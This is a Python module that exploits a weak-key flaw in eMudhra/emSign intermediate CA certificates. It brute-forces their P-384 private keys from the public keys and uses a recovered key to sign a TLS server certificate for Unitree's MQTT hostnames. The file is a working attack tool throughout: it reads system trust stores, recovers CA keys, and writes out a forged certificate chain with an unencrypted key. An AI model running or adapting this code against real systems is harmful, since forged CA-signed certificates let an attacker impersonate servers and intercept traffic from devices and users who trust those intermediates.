"""eMudhra intermediate CA key recovery and certificate forging.

CVE-2026-111943: eight eMudhra/emSign intermediate CA certificates were
generated with P-384 private scalar values smaller than 256, making the
private keys trivially recoverable by brute force.

This module:
  1. Scans a PEM CA bundle for eMudhra/emSign P-384 intermediates
  2. Recovers the private key by trying scalars 1..255
  3. Signs a TLS server certificate for the Unitree MQTT hostnames

The forged cert is accepted by any system whose trust store still includes
the compromised eMudhra intermediates (stock Ubuntu < 24.04.2, etc.).
"""

import logging
from datetime import datetime, timedelta, timezone
from pathlib import Path

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.x509.oid import NameOID

logger = logging.getLogger("unleash.certs.emudhra")

EMUDHRA_SUBJECT_KEYWORDS = ("emsign", "emudhra")

SYSTEM_CA_BUNDLES = [
    "/etc/ssl/certs/ca-certificates.crt",       # Debian/Ubuntu
    "/etc/pki/tls/certs/ca-bundle.crt",          # RHEL/Fedora
    "/etc/ssl/ca-bundle.pem",                    # openSUSE
    "/usr/local/share/certs/ca-root-nss.crt",    # FreeBSD
]

MQTT_HOSTNAMES = [
    "global-robot-mqtt.unitree.com",
    "robot-mqtt.unitree.com",
]


def parse_pem_bundle(pem_data: bytes) -> list[x509.Certificate]:
    """Extract all X.509 certificates from a concatenated PEM bundle."""
    certs = []
    for block in pem_data.split(b"-----END CERTIFICATE-----"):
        block = block.strip()
        if b"-----BEGIN CERTIFICATE-----" not in block:
            continue
        pem = block[block.index(b"-----BEGIN CERTIFICATE-----"):] + b"\n-----END CERTIFICATE-----\n"
        try:
            certs.append(x509.load_pem_x509_certificate(pem))
        except Exception:
            continue
    return certs


def _is_emudhra(cert: x509.Certificate) -> bool:
    """Check if a certificate's subject or issuer contains eMudhra/emSign."""
    for name in (cert.subject, cert.issuer):
        for attr in name:
            val = attr.value.lower() if isinstance(attr.value, str) else ""
            if any(kw in val for kw in EMUDHRA_SUBJECT_KEYWORDS):
                return True
    return False


def _is_weak_p384(cert: x509.Certificate) -> bool:
    """Check if a certificate has a P-384 public key with a weak scalar."""
    pub = cert.public_key()
    if not isinstance(pub, ec.EllipticCurvePublicKey):
        return False
    if not isinstance(pub.curve, ec.SECP384R1):
        return False
    target = pub.public_numbers()
    for d in range(1, 256):
        candidate = ec.derive_private_key(d, ec.SECP384R1())
        nums = candidate.public_key().public_numbers()
        if nums.x == target.x and nums.y == target.y:
            return True
    return False


def recover_key(cert: x509.Certificate) -> ec.EllipticCurvePrivateKey:
    """Brute-force a P-384 private key with scalar value < 256.

    Raises ValueError if the cert doesn't have a weak P-384 key.
    """
    pub = cert.public_key()
    if not isinstance(pub, ec.EllipticCurvePublicKey):
        raise ValueError("certificate does not have an EC public key")
    if not isinstance(pub.curve, ec.SECP384R1):
        raise ValueError(f"expected P-384, got {pub.curve.name}")

    target = pub.public_numbers()
    for d in range(1, 256):
        candidate = ec.derive_private_key(d, ec.SECP384R1())
        nums = candidate.public_key().public_numbers()
        if nums.x == target.x and nums.y == target.y:
            logger.info("recovered P-384 key (scalar=%d)", d)
            return candidate

    raise ValueError("key scalar >= 256 — not vulnerable to CVE-2026-111943")


def find_vulnerable_intermediate(
    ca_bundle: str | Path | None = None,
) -> tuple[x509.Certificate, ec.EllipticCurvePrivateKey]:
    """Scan a CA bundle for a vulnerable eMudhra intermediate and recover its key.

    Searches the given bundle path, or falls back to system CA bundle locations.
    Returns (intermediate_cert, recovered_private_key).

    Raises FileNotFoundError if no bundle is found, ValueError if no
    vulnerable eMudhra intermediate exists in the bundle.
    """
    if ca_bundle:
        bundle_path = Path(ca_bundle)
        if not bundle_path.exists():
            raise FileNotFoundError(f"CA bundle not found: {ca_bundle}")
        bundles = [bundle_path]
    else:
        bundles = [Path(p) for p in SYSTEM_CA_BUNDLES if Path(p).exists()]
        if not bundles:
            raise FileNotFoundError(
                "no system CA bundle found — provide one via ca_bundle= "
                "or place it at one of: " + ", ".join(SYSTEM_CA_BUNDLES)
            )

    for bundle_path in bundles:
        logger.info("scanning %s for vulnerable eMudhra intermediates", bundle_path)
        certs = parse_pem_bundle(bundle_path.read_bytes())

        emudhra_certs = [c for c in certs if _is_emudhra(c)]
        if not emudhra_certs:
            logger.debug("no eMudhra certs in %s", bundle_path)
            continue

        logger.info("found %d eMudhra cert(s), testing for weak P-384 keys", len(emudhra_certs))
        for cert in emudhra_certs:
            pub = cert.public_key()
            if not isinstance(pub, ec.EllipticCurvePublicKey):
                continue
            if not isinstance(pub.curve, ec.SECP384R1):
                continue
            try:
                key = recover_key(cert)
                cn = cert.subject.get_attributes_for_oid(NameOID.COMMON_NAME)
                name = cn[0].value if cn else "(unknown)"
                logger.info("vulnerable intermediate: %s", name)
                return cert, key
            except ValueError:
                continue

    raise ValueError(
        "no vulnerable eMudhra P-384 intermediate found in CA bundle(s) — "
        "the trust store may already have been patched"
    )


def generate_emudhra_signed(
    cert_dir: Path | None = None,
    hostname: str = "global-robot-mqtt.unitree.com",
    days: int = 365,
    ca_bundle: str | Path | None = None,
) -> tuple[Path, Path]:
    """Generate a server cert signed by a recovered eMudhra intermediate.

    Same return interface as generator.generate_self_signed() —
    returns (cert_chain_path, key_path).

    The cert chain PEM contains the server cert followed by the intermediate,
    so the TLS handshake presents the full chain.
    """
    from .generator import DEFAULT_CERT_DIR

    cert_dir = cert_dir or DEFAULT_CERT_DIR / "emudhra"
    cert_dir.mkdir(parents=True, exist_ok=True)

    chain_path = cert_dir / "server-chain.pem"
    key_path = cert_dir / "server.key"

    if chain_path.exists() and key_path.exists():
        return chain_path, key_path

    intermediate_cert, intermediate_key = find_vulnerable_intermediate(ca_bundle)

    server_key = ec.generate_private_key(ec.SECP256R1())

    subject = x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME, hostname),
    ])

    san = x509.SubjectAlternativeName([
        x509.DNSName(h) for h in MQTT_HOSTNAMES
    ])

    now = datetime.now(timezone.utc)
    builder = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(intermediate_cert.subject)
        .public_key(server_key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now)
        .not_valid_after(now + timedelta(days=days))
        .add_extension(san, critical=False)
        .add_extension(
            x509.BasicConstraints(ca=False, path_length=None), critical=True,
        )
        .add_extension(
            x509.ExtendedKeyUsage([x509.oid.ExtendedKeyUsageOID.SERVER_AUTH]),
            critical=False,
        )
    )

    server_cert = builder.sign(intermediate_key, hashes.SHA384())

    chain_pem = (
        server_cert.public_bytes(serialization.Encoding.PEM)
        + intermediate_cert.public_bytes(serialization.Encoding.PEM)
    )
    chain_path.write_bytes(chain_pem)

    key_path.write_bytes(server_key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.PKCS8,
        serialization.NoEncryption(),
    ))

    logger.info("wrote eMudhra-signed cert chain to %s", chain_path)
    return chain_path, key_path
